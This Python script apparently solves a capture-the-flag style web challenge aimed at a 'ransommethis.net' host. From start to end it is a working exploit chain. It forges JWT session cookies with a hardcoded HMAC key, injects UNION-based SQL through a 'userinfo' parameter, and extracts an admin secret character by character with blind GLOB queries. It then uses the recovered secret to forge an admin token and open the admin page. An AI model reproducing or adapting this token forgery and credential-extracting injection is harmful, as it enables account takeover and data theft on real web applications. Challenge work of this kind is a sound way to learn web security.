import requests
import jwt
from datetime import datetime, timedelta
import sqlite3
import time

def make_token(uid = 10294, secret = 'XQ8snyEw8ayiOXtkFapsnCikjDtll60V'):
    old_claims = {
        "iat": 1653538754,
        "exp": 1656130754,
        "sec": secret,
        "uid": uid
    }

    now = datetime.now()
    exp = now + timedelta(days=30)

    claims = {
        'iat': now,
        'exp': exp,
        'sec': old_claims['sec'],
        'uid': old_claims['uid']
    }

    # return jwt.encode(claims, hmac_key(), algorithm='HS256')
    # hmac_key(): returns "P9T43spRaRXrpB03PUpz7Wiv1d61qHqu"
    hmac_key = "P9T43spRaRXrpB03PUpz7Wiv1d61qHqu"

    token = jwt.encode(claims, key=hmac_key, algorithm='HS256')
    return token

def test_sqli(sqli):
    with sqlite3.connect('dummy_db') as con:
        query = 'TiresomeSnake'
        query = sqli
        infoquery= "SELECT u.memberSince, u.clientsHelped, u.hackersHelped, u.programsContributed FROM Accounts a INNER JOIN UserInfo u ON a.uid = u.uid WHERE a.userName='%s'" %query
        res = con.execute(infoquery)
        return res.fetchone(), res.fetchone()

url = 'https://suvwwcedmdcyelgn.ransommethis.net/znejayfsvdnrzptm/'

s = requests.Session()
cookies = {'tok': make_token()}

""" Test sqli """
sqli = "ImpartialStranger' UNION ALL SELECT uid, secret, 0, 0 FROM Accounts WHERE userName = 'ImpartialStranger';--"
res = test_sqli(sqli) 
# print(res)
# [(10, 'adminsecret', 'ImpartialStranger', 'someadminhash'), ('since', 'cll=ientHelped', 'hackHelped', 'progContr')]
""" --- """

""" Query for uid """
def uid_query():
    sqli = "ImpartialStranger' UNION ALL SELECT 1 AS q, 1 AS w, uid AS e, 1 AS abc FROM Accounts WHERE userName='ImpartialStranger' ORDER BY abc;--"
    r = s.get(url+'userinfo', params={'user':sqli}, cookies=cookies)
    print(r.text)
# uid_query()

""" Query for secret """
def secret_query():
    
    # sqli = "ImpartialStranger' UNION ALL SELECT 1 AS q, 1 AS w, uid AS e, 1 AS abc FROM Accounts WHERE userName='ImpartialStranger' AND secret LIKE BINARY '{}%' ORDER BY abc;--"
    sqli = "ImpartialStranger' UNION ALL SELECT 1 AS q, 1 AS w, uid AS e, 1 AS abc FROM Accounts WHERE userName='ImpartialStranger' AND secret GLOB '{}*' ORDER BY abc;--"
    charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

    uid = '3923'
    secret = ''
    reg_secret = 'XQ8snyEw8ayiOXtkFapsnCikjDtll60V' 
    for _ in range(len(reg_secret)*2): # assuming the secrets are same length
        for c in charset:
            # print('sending')
            r = s.get(url+'userinfo', params={'user':sqli.format(secret+c)}, cookies=cookies)
            if uid in r.text:
                print(c)
                secret += c
                break

    print(secret)
    # fxpiu14hmcrgbzrehvklcfvxuyxcfswe (wrong, case insensitive)
    # fxpIU14hMCRgBzrEHVklCfVxUYXCfswe (correct, case sensititve)

# secret_query() 

""" Check admin login """
admin_cookie = {'tok' : make_token(uid=3923, secret='fxpIU14hMCRgBzrEHVklCfVxUYXCfswe')}
r = s.get(url+'userinfo', cookies=admin_cookie)
print(r.text)

r = s.get(url+'admin', cookies=admin_cookie)
print(r.text)